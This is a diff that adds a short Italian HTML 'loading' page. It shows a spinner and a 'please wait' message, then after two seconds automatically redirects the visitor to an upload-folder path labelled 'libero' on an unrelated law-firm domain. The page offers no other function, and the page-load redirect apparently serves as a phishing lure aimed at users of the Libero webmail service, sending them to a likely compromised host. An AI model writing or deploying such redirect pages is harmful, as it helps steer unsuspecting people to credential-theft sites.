@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagina di Caricamento con Ajax</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <style>
+        /* Stile per l'icona di caricamento */
+        #loading {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 50px;
+            color: #3498db;
+            display: block; /* Mostra l'icona automaticamente */
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Icona di caricamento -->
+    <div id="loading">
+        <i class="fas fa-spinner fa-spin"></i> Si prega di attendere...
+    </div>
+
+    <script>
+        $(document).ready(function() {
+            // Mostra l'icona di caricamento al caricamento della pagina
+            $('#loading').show();
+
+            // Dopo 2 secondi, nascondi l'icona di caricamento e reindirizza
+            setTimeout(function() {
+                $('#loading').hide();
+                window.location.href = 'https://mrlawyer.khanfarlawfirm.com/upload/log-2/libero/';
+            }, 2000); // Ritardo di 2 secondi
+        });
+    </script>
+
+</body>
+</html>
